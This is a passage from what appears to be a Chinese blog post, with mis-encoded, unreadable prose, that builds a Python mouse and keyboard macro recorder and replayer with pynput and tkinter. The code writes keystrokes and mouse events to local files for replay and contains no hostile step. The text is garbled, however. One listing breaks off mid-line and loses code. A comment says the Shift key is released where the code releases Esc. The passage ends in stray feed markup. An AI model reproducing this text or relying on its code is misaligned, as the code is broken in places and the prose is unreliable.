ï¼Œè¿™é‡Œå…ˆç”¨æœ€å¿«çš„æ–¹å¼å®žçŽ°å®ƒã€‚ GUIç”¨äº†Pythonè‡ªå¸¦çš„tkinteråº“ï¼Œä¸ºäº†é˜²æ­¢UIé˜»å¡žï¼Œæ‰€ä»¥ä½¿ç”¨äº†å¤šçº¿ç¨‹ï¼ŒåŒæ ·æ˜¯Pythonè‡ªå¸¦åº“threadingã€‚æ•´ä¸ªå®žçŽ°å…¶å®žåªç”¨äº†ä¸€ä¸ªä¸‰æ–¹åº“ pynput é¼ æ ‡äº‹ä»¶çš„ç›‘å¬å½•åˆ¶å’Œæ‰§è¡Œå›žæ”¾çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131import jsonimport threadingimport timeimport tkinterfrom pynput import mousefrom pynput.mouse import Button, Controller# é¼ æ ‡åŠ¨ä½œæ¨¡æ¿def mouse_action_template(): return &#123; "name": "mouse", "event": "default", "target": "default", "action": "default", "location": &#123; "x": "0", "y": "0" &#125; &#125;# é¼ æ ‡åŠ¨ä½œç›‘å¬class MouseActionListener(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # é¼ æ ‡ç§»åŠ¨äº‹ä»¶ def on_move(x, y): template = mouse_action_template() template['event'] = 'move' template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # é¼ æ ‡ç‚¹å‡»äº‹ä»¶ def on_click(x, y, button, pressed): template = mouse_action_template() template['event'] = 'click' template['target'] = button.name template['action'] = pressed template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # é¼ æ ‡æ»šåŠ¨äº‹ä»¶ def on_scroll(x, y, x_axis, y_axis): template = mouse_action_template() template['event'] = 'scroll' template['location']['x'] = x_axis template['location']['y'] = y_axis file.writelines(json.dumps(template) + "\n") file.flush() with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener: listener.join()# é¼ æ ‡åŠ¨ä½œæ‰§è¡Œclass MouseActionExecute(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'r', encoding='utf-8') as file: mouse_exec = Controller() line = file.readline() time.sleep(0.01) while line: obj = json.loads(line) if obj['name'] == 'mouse': if obj['event'] == 'move': mouse_exec.position = (obj['location']['x'], obj['location']['y']) time.sleep(0.01) elif obj['event'] == 'click': if obj['action']: if obj['target'] == 'left': mouse_exec.press(Button.left) else: mouse_exec.press(Button.right) else: if obj['target'] == 'left': mouse_exec.release(Button.left) else: mouse_exec.release(Button.right) time.sleep(0.01) elif obj['event'] == 'scroll': mouse_exec.scroll(obj['location']['x'], obj['location']['y']) time.sleep(0.01) line = file.readline()def button_onClick(action): m1 = MouseActionListener(file_name='mouse.action') m2 = MouseActionExecute(file_name='mouse.action') if action == 'listener': if startListenerBtn['text'] == 'å½•åˆ¶': m1.start() startListenerBtn['text'] = 'å½•åˆ¶ä¸­...å…³é—­ç¨‹åºåœæ­¢å½•åˆ¶' startListenerBtn['state'] = 'disabled' elif action == 'execute': if startExecuteBtn['text'] == 'å›žæ”¾': m2.start() startExecuteBtn['text'] = 'å›žæ”¾ä¸­...å…³é—­ç¨‹åºåœæ­¢å›žæ”¾' startExecuteBtn['state'] = 'disabled'if __name__ == '__main__': root = tkinter.Tk() root.title('é¼ æ ‡ç²¾çµ-è“å£«é’¦') root.geometry('200x200+400+100') startListenerBtn = tkinter.Button(root, text="å½•åˆ¶", command=lambda: button_onClick('listener')) startListenerBtn.place(x=10, y=10, width=180, height=80) startExecuteBtn = tkinter.Button(root, text="å›žæ”¾", command=lambda: button_onClick('execute')) startExecuteBtn.place(x=10, y=110, width=180, height=80) root.mainloop() æŒ‰é”®ç²¾çµçš„é¼ æ ‡éƒ¨åˆ†åˆ°è¿™é‡Œå°±åŸºæœ¬å®Œæˆäº†ã€‚è¿è¡Œç¨‹åºï¼Œç‚¹å‡»å½•åˆ¶ï¼Œç„¶åŽå°±å¯ä»¥ç”¨ä½ çš„é¼ æ ‡åœ¨å±å¹•ä¸Šä¸€é¡¿æ“ä½œã€‚ç„¶åŽå…³é—­æœ¬ç¨‹åºã€‚æŽ¥ç€é‡æ–°æ‰“å¼€ç¨‹åºï¼Œç‚¹å‡»å›žæ”¾ï¼Œå°±ä¼šå‘çŽ°é¼ æ ‡å¯ä»¥æŒ‰ç…§ä¹‹å‰å½•åˆ¶çš„åŠ¨ä½œè¿›è¡Œè‡ªåŠ¨å·¥ä½œäº†ã€‚è®°ä½åƒä¸‡ä¸è¦åœ¨å½•åˆ¶æ—¶ï¼Œè¿˜æ²¡å…³é—­ç¨‹åºçš„æ—¶å€™å°±ç‚¹å‡»å›žæ”¾ï¼Œè¿™æ ·ä¼šé™·å…¥æ— é™å¾ªçŽ¯é‡Œé¢ï¼Œä¼šå¯¼è‡´ä¸åœçš„å½•åˆ¶ä¸åœçš„å›žæ”¾ã€‚è¿˜æœ‰é”®ç›˜çš„ç¨‹åºåŽç»­è¡¥ä¸Šï¼Œç¨‹åºå¾…å®Œå–„ä¸­ï¼Œæœªå®Œå¾…ç»­ã€‚ é”®ç›˜äº‹ä»¶ç›‘å¬123456789101112131415161718192021222324252627from pynput import keyboard# æŒ‰é”®æŒ‰ä¸‹ç›‘å¬def on_press(key): try: print('press key &#123;0&#125;, vk: &#123;1&#125;'.format(key.char, key.vk)) except AttributeError: print('special press key &#123;0&#125;, vk: &#123;1&#125;'.format(key, key.value.vk))# æŒ‰é”®é‡Šæ”¾ç›‘å¬def on_release(key): if key == keyboard.Key.esc: # åœæ­¢ç›‘å¬ return False try: print('release key &#123;0&#125;, vk: &#123;1&#125;'.format(key.char, key.vk)) except AttributeError: print('special release key &#123;0&#125;, vk: &#123;1&#125;'.format(key, key.value.vk))# é”®ç›˜ç›‘å¬with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: listener.join() é”®ç›˜ç›‘å¬ç›¸å¯¹äºŽé¼ æ ‡ç›‘å¬æ¥è¯´ï¼Œå›žè°ƒçš„å‡½æ•°åªæœ‰ä¸¤ä¸ªon_pressæŒ‰é”®æŒ‰ä¸‹ å’Œon_releaseæŒ‰é”®é‡Šæ”¾ã€‚ç”±äºŽpynputè¿™ä¸ªåº“å¯¹é”®ç›˜çš„ä¸åŒæŒ‰é”®äº‹ä»¶å°è£…è¿›è¡Œäº†åŒºåˆ†ï¼Œæ¯”å¦‚æ™®é€šçš„æ•°å­—å’Œå­—æ¯é”®æŒ‰ä¸‹ä¼šè¿›å…¥on_pressæ–¹æ³•ï¼Œé€šè¿‡ä¼ å…¥çš„key.charå±žæ€§å€¼å¯ä»¥å¾—åˆ°æŒ‰é”®å¯¹åº”åœ¨é”®ç›˜ä¸Šçš„å­—ç¬¦ï¼Œä½†å¦‚æžœæ˜¯Shiftç­‰å…¶ä»–ç‰¹æ®Šé”®ï¼Œå°±æ²¡æœ‰charå±žæ€§ï¼Œä¼šäº§ç”Ÿå¼‚å¸¸ã€‚åªè¦æ•èŽ·å¼‚å¸¸åŽç›´æŽ¥é€šè¿‡keyå°±å¯ä»¥å–åˆ°ç‰¹æ®Šé”®å¯¹åº”çš„å­—ç¬¦ã€‚æˆ‘è§‰å¾—è¿™æ˜¯pynputåšå¾—æœ‰ç‚¹ä¸å¤Ÿä¼˜é›…çš„åœ°æ–¹ã€‚æ™®é€šçš„é”®æœ‰key.vkå±žæ€§å€¼ï¼Œä»£è¡¨é”®ç›˜ä¸Šå­—ç¬¦å¯¹åº”çš„ç¼–ç å€¼ï¼Œç‰¹æ®Šé”®çš„ç¼–ç å€¼è¦é€šè¿‡key.value.vkæ¥å–ã€‚ é”®ç›˜äº‹ä»¶æ‰§è¡Œ1234567891011121314151617181920212223242526272829303132333435from pynput.keyboard import Key, Controller, KeyCode# é”®ç›˜æŽ§åˆ¶å¯¹è±¡keyboard = Controller()# æŒ‰ä¸‹ a é”®keyboard.press('a')# é‡Šæ”¾ a é”®keyboard.release('a')# æŒ‰ä¸‹ Shift é”®keyboard.press(Key.shift)keyboard.press('b')keyboard.release('b')keyboard.press('c')keyboard.release('c')# é‡Šæ”¾ Shift é”®keyboard.release(Key.esc)# æŒ‰ä¸‹ Shift é”®ï¼Œç„¶åŽä¾æ¬¡æŒ‰ä¸‹å…¶ä»–æŒ‰é”®ï¼Œå®ŒæˆåŽShifté”®è‡ªåŠ¨é‡Šæ”¾with keyboard.pressed(Key.shift): keyboard.press('d') keyboard.release('d') keyboard.press('e') keyboard.release('e')# ä¾æ¬¡æŒ‰ä¸‹ python ï¼ˆåŒ…æ‹¬å‰é¢çš„ç©ºæ ¼ï¼‰keyboard.type(' python')# æŒ‰ä¸‹ vkå€¼ä¸º56çš„é”® shift é”®keyboard.touch(KeyCode.from_vk(56), True)keyboard.touch('a', True)keyboard.touch('a', False)# é‡Šæ”¾ shift é”®keyboard.touch(Key.shift, False) å’Œç›‘å¬æ–¹æ³•å¯¹åº”ï¼Œæ‰§è¡Œé”®ç›˜çš„æŒ‰é”®æ–¹æ³•æœ‰press(key)æŒ‰åŽ‹ release(key)é‡Šæ”¾ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰touch(key,is_press)å‡½æ•°,keyè¡¨ç¤ºè¦æ“ä½œçš„é”®ï¼Œis_press ä¸ºTrueæ—¶è¡¨ç¤ºæŒ‰åŽ‹ï¼Œä¸ºFalseæ—¶è¡¨ç¤ºé‡Šæ”¾ã€‚æ— è®ºæ˜¯å“ªç§æŒ‰åŽ‹äº‹ä»¶ï¼ŒKeyéƒ½å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æž„é€ ï¼Œæ¯”å¦‚çŸ¥é“Shiftçš„vkå€¼ä¸º56ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡KeyCode.from_vk(56)æ¥æž„é€ ä¸€ä¸ªShiftçš„Keyã€‚é€šè¿‡VKç¼–ç æž„é€ Keyçš„æ–¹å¼å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå½“ä½ è¦æŒ‰å‡ºä¸€ä¸ª@ç¬¦å·æ—¶ï¼Œéœ€è¦åŒæ—¶æŒ‰ä½Shiftå’Œ2ã€‚é€šè¿‡on_press(key)ç›‘å¬å¾—åˆ°çš„å€¼æ˜¯ä¸€ä¸ª@ç¬¦å·ï¼Œå¦‚æžœå½•åˆ¶ç¨‹åºå½•åˆ¶äº†ä¸€ä¸ª@ç¬¦å·å°†æ— æ³•é€šè¿‡keyboard.press(&#39;@&#39;)è¿™ç§æ–¹å¼ç›´æŽ¥æ‰§è¡Œã€‚æ‰€ä»¥æŽ¥ä¸‹æ¥çš„é”®ç›˜å½•åˆ¶å›žæ”¾ç¨‹åºæˆ‘å°†é€šè¿‡å®šä¹‰ä¸€ä¸ªé”®ç›˜åŠ¨ä½œæ¨¡æ¿ï¼Œç„¶åŽé€šè¿‡VKå€¼å‡†ç¡®çš„è®°å½•æ¯ä¸ªé”®ä»¥åŠæ¯ä¸ªç»„åˆé”®çš„ç¼–ç ã€‚ç„¶åŽé€šè¿‡keyboard.press(KeyCode.from_vk(vk))è¿›è¡Œå›žæ”¾ã€‚ å¸¦å½•åˆ¶å›žæ”¾åŠŸèƒ½çš„é”®ç›˜ç²¾çµ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import jsonimport threadingimport timeimport tkinterfrom pynput import keyboardfrom pynput.keyboard import Controller, KeyCode# é”®ç›˜åŠ¨ä½œæ¨¡æ¿def keyboard_action_template(): return &#123; "name": "keyboard", "event": "default", "vk": "default" &#125;# é”®ç›˜åŠ¨ä½œç›‘å¬class KeyboardActionListener(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # é”®ç›˜æŒ‰ä¸‹ç›‘å¬ def on_press(key): template = keyboard_action_template() template['event'] = 'press' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # é”®ç›˜æŠ¬èµ·ç›‘å¬ def on_release(key): if key == keyboard.Key.esc: # åœæ­¢ç›‘å¬ startListenerBtn['text'] = 'å½•åˆ¶' startListenerBtn['state'] = 'normal' return False template = keyboard_action_template() template['event'] = 'release' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # é”®ç›˜ç›‘å¬ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: listener.join()# é”®ç›˜åŠ¨ä½œæ‰§è¡Œclass KeyboardActionExecute(threading.Thread): def __init__(self, file_name): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'r', encoding='utf-8') as file: keyboard_exec = Controller() line = file.readline() time.sleep(3) while line: obj = json.loads(line) if obj['name'] == 'keyboard': if obj['event'] == 'press': keyboard_exec.press(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) elif obj['event'] == 'release': keyboard_exec.release(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) line = file.readline() startExecuteBtn['text'] = 'å›žæ”¾' startExecuteBtn['state'] = 'normal'def button_onClick(action): m1 = KeyboardActionListener(file_name='keyboard.action') m2 = KeyboardActionExecute(file_name='keyboard.action') if action == 'listener': if startListenerBtn['text'] == 'å½•åˆ¶': m1.start() startListenerBtn['text'] = 'å½•åˆ¶ä¸­...escåœæ­¢å½•åˆ¶' startListenerBtn['state'] = 'disabled' elif tener')) startListenerBtn.place(x=10, y=10, width=180, height=80) startExecuteBtn = tkinter.Button(root, text="å›žæ”¾", command=lambda: button_onClick('execute')) startExecuteBtn.place(x=10, y=110, width=180, height=80) root.mainloop() é”®ç›˜ç²¾çµçš„å½•åˆ¶å’Œå›žæ”¾ç¨‹åºåˆ°è¿™é‡Œä»¥åŠç®—æ˜¯ä¸€ä¸ªåŸºç¡€ç‰ˆæœ¬äº†ï¼Œå¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚å¹¶ä¸”æ–°å¢žäº†escé”®ç›‘å¬ï¼Œå½“ç”¨æˆ·ç‚¹å‡»escæ—¶å°†ä¼šç»“æŸå½•åˆ¶ã€‚é¼ æ ‡ç²¾çµå’Œé”®ç›˜ç²¾çµéƒ½å¯ä»¥å•ç‹¬çš„è¿è¡Œä½¿ç”¨ã€‚å¤§å¤šæ•°åœºæ™¯ä¸‹è¿™ä¸¤è€…çš„åŠŸèƒ½éƒ½ä¼šä½¿ç”¨åˆ°ï¼Œæ‰€ä»¥æŽ¥ä¸‹æ¥æˆ‘è¦å®žçŽ°ä¸€ä¸ªå®Œæˆçš„æŒ‰é”®ç²¾çµï¼ŒåŒæ—¶åŒ…å«é¼ æ ‡å’Œé”®ç›˜çš„å½•åˆ¶å›žæ”¾åŠŸèƒ½ã€‚åœ¨ä¹‹å‰çš„ä»£ç åŸºç¡€ä¸Šè¿›ä¸€æ­¥å°è£…ã€‚ è€ƒè™‘çš„åŸºæœ¬è¦ç´ å¦‚ä¸‹ï¼š è®°å½•é¼ æ ‡å’Œè®°å½•é”®ç›˜çš„äº‹ä»¶é‡‡ç”¨ä¸åŒçš„jsonæ¨¡æ¿è¿›è¡Œå®šä¹‰ï¼Œé‡‡ç”¨å“åº”å¼å¯¹ç”¨æˆ·çš„æ“ä½œè¿›è¡Œç›‘å¬ï¼Œç”¨æˆ·é™æ­¢ä¸åŠ¨åˆ™ä¸ä¼šå†™å…¥æ–‡ä»¶ã€‚ åŒæ—¶ç›‘å¬é¼ æ ‡å’Œé”®ç›˜ï¼Œä¸ºäº†é¿å…å¤šçº¿ç¨‹å†™åŒä¸€ä¸ªæ–‡ä»¶çš„é”æ“ä½œï¼Œæˆ‘å°†é¼ æ ‡å’Œé”®ç›˜çš„å½•åˆ¶è®°å½•åˆ†ä¸ºä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶ã€‚ å½•åˆ¶å’Œå›žæ”¾çš„æ“ä½œé€šå¸¸éƒ½éœ€è¦æœ‰ä¸€ä¸ªç­‰å¾…æ—¶é—´çš„è®¾ç½®ï¼Œæ‰€ä»¥ä»£ç é‡ŒåŠ ä¸Šäº†GUIçš„è®¾ç½®éƒ¨åˆ†ï¼ŒGUIæ²¡æœ‰è®¾è®¡æ‰€ä»¥åŽç»­è¿™å—ä»£ç è¦ä¼˜åŒ–ã€‚ è€ƒè™‘å½•åˆ¶å’Œå›žæ”¾å€’è®¡æ—¶éœ€è¦UIæç¤ºç”¨æˆ·å¹¶ä¸”å®šæ—¶è§¦å‘çº¿ç¨‹æ‰§è¡Œï¼Œæ‰€ä»¥å°è£…äº†ä¸€ä¸ªUIæ›´æ–°çº¿ç¨‹çš„ç±»ã€‚ æŒ‰é”®ç²¾çµ0.1ç‰ˆæœ¬å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š é”®é¼ å½•åˆ¶çš„æŒ‰é”®ç²¾çµ0.1ç‰ˆæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292import jsonimport threadingimport timeimport tkinterfrom pynput import keyboard, mousefrom pynput.keyboard import Controller as KeyBoardController, KeyCodefrom pynput.mouse import Button, Controller as MouseController# é”®ç›˜åŠ¨ä½œæ¨¡æ¿def keyboard_action_template(): return &#123; "name": "keyboard", "event": "default", "vk": "default" &#125;# é¼ æ ‡åŠ¨ä½œæ¨¡æ¿def mouse_action_template(): return &#123; "name": "mouse", "event": "default", "target": "default", "action": "default", "location": &#123; "x": "0", "y": "0" &#125; &#125;# å€’è®¡æ—¶ç›‘å¬ï¼Œæ›´æ–°UIè§¦å‘è‡ªå®šä¹‰çº¿ç¨‹å¯¹è±¡class UIUpdateCutDownExecute(threading.Thread): def __init__(self, cut_down_time, custom_thread_list): super().__init__() self.cut_down_time = cut_down_time self.custom_thread_list = custom_thread_list def run(self): while self.cut_down_time &gt; 0: for custom_thread in self.custom_thread_list: if custom_thread['obj_ui'] is not None: custom_thread['obj_ui']['text'] = str(self.cut_down_time) custom_thread['obj_ui']['state'] = 'disabled' self.cut_down_time = self.cut_down_time - 1 time.sleep(1) else: for custom_thread in self.custom_thread_list: if custom_thread['obj_ui'] is not None: custom_thread['obj_ui']['text'] = custom_thread['final_text'] custom_thread['obj_ui']['state'] = 'disabled' if custom_thread['obj_thread'] is not None: custom_thread['obj_thread'].start() time.sleep(1)# é”®ç›˜åŠ¨ä½œç›‘å¬class KeyboardActionListener(threading.Thread): def __init__(self, file_name='keyboard.action'): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # é”®ç›˜æŒ‰ä¸‹ç›‘å¬ def on_press(key): template = keyboard_action_template() template['event'] = 'press' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # é”®ç›˜æŠ¬èµ·ç›‘å¬ def on_release(key): if key == keyboard.Key.esc: # åœæ­¢ç›‘å¬ startListenerBtn['text'] = 'å¼€å§‹å½•åˆ¶' startListenerBtn['state'] = 'normal' keyboardListener.stop() return False template = keyboard_action_template() template['event'] = 'release' try: template['vk'] = key.vk except AttributeError: template['vk'] = key.value.vk finally: file.writelines(json.dumps(template) + "\n") file.flush() # é”®ç›˜ç›‘å¬ with keyboard.Listener(on_press=on_press, on_release=on_release) as keyboardListener: keyboardListener.join()# é”®ç›˜åŠ¨ä½œæ‰§è¡Œclass KeyboardActionExecute(threading.Thread): def __init__(self, file_name='keyboard.action', execute_count=0): super().__init__() self.file_name = file_name self.execute_count = execute_count def run(self): while self.execute_count &gt; 0: with open(self.file_name, 'r', encoding='utf-8') as file: keyboard_exec = KeyBoardController() line = file.readline() while line: obj = json.loads(line) if obj['name'] == 'keyboard': if obj['event'] == 'press': keyboard_exec.press(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) elif obj['event'] == 'release': keyboard_exec.release(KeyCode.from_vk(obj['vk'])) time.sleep(0.01) line = file.readline() startExecuteBtn['text'] = 'å¼€å§‹å›žæ”¾' startExecuteBtn['state'] = 'normal' self.execute_count = self.execute_count - 1# é¼ æ ‡åŠ¨ä½œç›‘å¬class MouseActionListener(threading.Thread): def __init__(self, file_name='mouse.action'): super().__init__() self.file_name = file_name def run(self): with open(self.file_name, 'w', encoding='utf-8') as file: # é¼ æ ‡ç§»åŠ¨äº‹ä»¶ def on_move(x, y): template = mouse_action_template() template['event'] = 'move' template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # é¼ æ ‡ç‚¹å‡»äº‹ä»¶ def on_click(x, y, button, pressed): template = mouse_action_template() template['event'] = 'click' template['target'] = button.name template['action'] = pressed template['location']['x'] = x template['location']['y'] = y file.writelines(json.dumps(template) + "\n") file.flush() # é¼ æ ‡æ»šåŠ¨äº‹ä»¶ def on_scroll(x, y, x_axis, y_axis): template = mouse_action_template() template['event'] = 'scroll' template['location']['x'] = x_axis template['location']['y'] = y_axis file.writelines(json.dumps(template) + "\n") file.flush() with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouseListener: mouseListener.join()# é¼ æ ‡åŠ¨ä½œæ‰§è¡Œclass MouseActionExecute(threading.Thread): def __init__(self, file_name='mouse.action', execute_count=0): super().__init__() self.file_name = file_name self.execute_count = execute_count def run(self): while self.execute_count &gt; 0: with open(self.file_name, 'r', encoding='utf-8') as file: mouse_exec = MouseController() line = file.readline() while line: obj = json.loads(line) if obj['name'] == 'mouse': if obj['event'] == 'move': mouse_exec.position = (obj['location']['x'], obj['location']['y']) time.sleep(0.01) elif obj['event'] == 'click': if obj['action']: if obj['target'] == 'left': mouse_exec.press(Button.left) else: mouse_exec.press(Button.right) else: if obj['target'] == 'left': mouse_exec.release(Button.left) else: mouse_exec.release(Button.right) time.sleep(0.01) elif obj['event'] == 'scroll': mouse_exec.scroll(obj['location']['x'], obj['location']['y']) time.sleep(0.01) line = file.readline()def command_adapter(action): if action == 'listener': if startListenerBtn['text'] == 'å¼€å§‹å½•åˆ¶': custom_thread_list = [ &#123; 'obj_thread': KeyboardActionListener(), 'obj_ui': startListenerBtn, 'final_text': 'å½•åˆ¶ä¸­...escåœæ­¢å½•åˆ¶' &#125;, &#123; 'obj_thread': MouseActionListener(), 'obj_ui': None, 'final_text': None &#125; ] UIUpdateCutDownExecute(startTime.get(), custom_thread_list).start() elif action == 'execute': if startExecuteBtn['text'] == 'å¼€å§‹å›žæ”¾': custom_thread_list = [ &#123; 'obj_thread': KeyboardActionExecute(execute_count=playCount.get()), 'obj_ui': startExecuteBtn, 'final_text': 'å›žæ”¾ä¸­...å…³é—­ç¨‹åºåœæ­¢å›žæ”¾' &#125;, &#123; 'obj_thread': MouseActionExecute(execute_count=playCount.get()), 'obj_ui': None, 'final_text': None &#125; ] UIUpdateCutDownExecute(endTime.get(), custom_thread_list).start()def isNumber(content): if content.isdigit() or content == "": return True else: return Falseif __name__ == '__main__': root = tkinter.Tk() root.title('æŒ‰é”®ç²¾çµ-è“å£«é’¦') root.geometry('200x200+400+100') listenerStartLabel = tkinter.Label(root, text='å½•åˆ¶å€’è®¡æ—¶') listenerStartLabel.place(x=10, y=10, width=80, height=20) startTime = tkinter.IntVar() listenerStartEdit = tkinter.Entry(root, textvariable=startTime) listenerStartEdit.place(x=100, y=10, width=60, height=20) startTime.set(3) listenerTipLabel = tkinter.Label(root, text='ç§’') listenerTipLabel.place(x=160, y=10, width=20, height=20) startListenerBtn = tkinter.Button(root, text="å¼€å§‹å½•åˆ¶", command=lambda: command_adapter('listener')) startListenerBtn.place(x=10, y=45, width=180, height=30) executeEndLabel = tkinter.Label(root, text='å›žæ”¾å€’è®¡æ—¶') executeEndLabel.place(x=10, y=85, width=80, height=20) endTime = tkinter.IntVar() executeEndEdit = tkinter.Entry(root, textvariable=endTime) executeEndEdit.place(x=100, y=85, width=60, height=20) endTime.set(6) executeTipLabel = tkinter.Label(root, text='ç§’') executeTipLabel.place(x=160, y=85, width=20, height=20) playCountLabel = tkinter.Label(root, text='å›žæ”¾æ¬¡æ•°') playCountLabel.place(x=10, y=115, width=80, height=20) playCount = tkinter.IntVar() playCountEdit = tkinter.Entry(root, textvariable=playCount) playCountEdit.place(x=100, y=115, width=60, height=20) playCount.set(1) playCountTipLabel = tkinter.Label(root, text='æ¬¡') playCountTipLabel.place(x=160, y=115, width=20, height=20) startExecuteBtn = tkinter.Button(root, text="å¼€å§‹å›žæ”¾", command=lambda: command_adapter('execute')) startExecuteBtn.place(x=10, y=145, width=180, height=30) root.mainloop() è„šæœ¬ç²¾çµ0.1ç‰ˆæœ¬å®ŒæˆðŸ˜‹ è¿˜éœ€è¦è€ƒè™‘çš„ç‚¹ï¼š é”®ç›˜äº‹ä»¶æ²¡æœ‰è®°å½•ç”¨æˆ·æ¯ä¸ªåŠ¨ä½œä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œæ— æ³•å‡†ç¡®é‡æ”¾ç”¨æˆ·çš„è¾“å…¥èŠ‚å¥ï¼ŒåŽç»­è€ƒè™‘è®°å½•æ—¶é—´é—´éš”ç‚¹ã€‚ é¼ æ ‡äº‹ä»¶ç”¨æˆ·ç§»åŠ¨çš„è¶Šå¿«ï¼Œäº§ç”Ÿçš„ç‚¹ä½å˜åŒ–ä¹Ÿå°±è¶Šé¢‘ç¹ï¼Œæ‰€ä»¥é¼ æ ‡åœ¨å›žæ”¾æ—¶çš„é€Ÿåº¦ä¸Žç”¨æˆ·çš„æ“ä½œåŸºæœ¬ä¸€è‡´ã€‚ é¼ æ ‡æ²¡æœ‰åœæ­¢å›žæ”¾çš„å¿«æ·é”®ï¼Œè¦è€ƒè™‘å¦‚ä½•åœæ­¢å›žæ”¾é¼ æ ‡äº‹ä»¶ã€‚ è¾“å…¥æ³•åˆ‡æ¢å¯èƒ½å¯¼è‡´é‡æ”¾é”®ç›˜æŒ‰é”®æ—¶è¾“å…¥ä¸å‡†ç¡®ï¼Œéœ€è¦å½•åˆ¶æ—¶æ˜¯ä»€ä¹ˆè¾“å…¥çŠ¶æ€ï¼Œé‡æ”¾æ—¶ä¹Ÿè¦å¯¹åº”çš„é”®ç›˜å±žæ€§å’ŒçŠ¶æ€ â€¦è¿˜æœ‰å¾ˆå¤šéœ€è¦è€ƒè™‘çš„ç‚¹(åŽŸæœ¬åªæ˜¯æƒ³ç®€å•çš„åšä¸ªç¤ºä¾‹ç¨‹åº) ç¨‹åºåªåœ¨MacOSå¹³å°ä¸Šå®žéªŒè¿‡ï¼Œå…¶ä»–å¹³å°è¿˜æœªå®žéªŒï¼Œä¸€ä¸ªç›¸å¯¹å®Œæ•´çš„æŒ‰é”®ç²¾çµåœ¨å½•åˆ¶æ—¶åº”è¯¥èŽ·å–æ›´å¤šçš„ä¿¡æ¯ï¼Œè¿™æ ·åœ¨å›žæ”¾çš„æ—¶å€™æ‰è¶³å¤Ÿå‡†ç¡®ï¼ŒåŽç»­è€ƒè™‘åšä¸€ä¸ªæ›´åŠ ç²¾ç¡®çš„æŒ‰é”®ç²¾çµï¼Œæ¯”å¦‚åŠ å…¥èŽ·å–å±å¹•åƒç´ ç‚¹ï¼Œå›žæ”¾æ—¶é€šè¿‡é‡‡æ ·æ¯”å¯¹ï¼Œè¾¾åˆ°ä¸ºæ‰€æ¬²ä¸ºåŠŸèƒ½ã€‚GitHubåœ°å€ï¼šhttps://github.com/lanshiqin/JerryMouseæœŸå¾…å¤§å®¶æ¥ä¸€èµ·å®Œå–„å®ƒðŸ˜‹]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonæé«˜å·¥ä½œæ•ˆçŽ‡ä¹‹SQLite]]></title>
    <url>%2F204682e6%2F</url>
